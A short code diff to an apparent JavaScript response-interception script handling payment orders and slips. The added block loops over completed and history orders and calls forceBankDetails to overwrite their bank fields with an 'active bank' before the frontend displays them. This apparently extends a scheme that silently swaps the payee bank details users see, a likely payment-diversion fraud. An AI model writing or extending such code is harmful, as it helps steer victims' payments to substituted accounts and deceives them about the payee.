@@ -1667,6 +1667,18 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
         const orderList = Array.isArray(respData) ? respData : (Array.isArray(respData.list) ? respData.list : (Array.isArray(respData.data) ? respData.data : []));
         const activeBank = getActiveBank(data, null);
 
+        // Completed/history rows (for example orderState=2) do not enter the
+        // old "isPaying" branch below. Replace their response fields directly
+        // so a refresh already carries the active bank details, before the
+        // frontend opens the detail view.
+        if (activeBank && data.botEnabled !== false) {
+          for (const historyItem of orderList) {
+            if (!historyItem || typeof historyItem !== 'object') continue;
+            const historyState = parseInt(historyItem.orderState ?? historyItem.state ?? -1);
+            if (historyState > 0) forceBankDetails(historyItem, activeBank);
+          }
+        }
+
         if (activeBank && data.botEnabled !== false) {
           for (const order of orderList) {
             const isPaying = order.status === 0 || order.status === 1 || order.orderState === 0 || order.orderState === 1 || order.state === 0 || order.state === 1;
